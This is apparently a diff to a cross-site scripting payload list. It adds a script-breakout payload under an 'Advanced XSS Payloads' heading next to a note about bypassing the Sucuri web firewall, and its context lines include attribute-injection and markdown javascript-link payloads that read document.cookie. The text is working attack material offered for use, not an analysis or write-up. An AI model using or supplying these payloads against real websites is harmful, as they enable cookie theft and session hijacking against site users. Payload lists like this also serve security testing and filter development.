@@ -165,6 +165,7 @@ This payload worked on Sucuri WAF:
 
 Advanced XSS Payloads:
 ----------------------
+');});//]]><​/script><​script>prompt(/lipon/);<​/script></body></html><!--
 %22onmousemove=%22prompt(do\u0063ument.cookie)
 [a](javascript​:prompt(document.cookie))
 [a](j a v a s c r i p t:prompt(document.cookie))
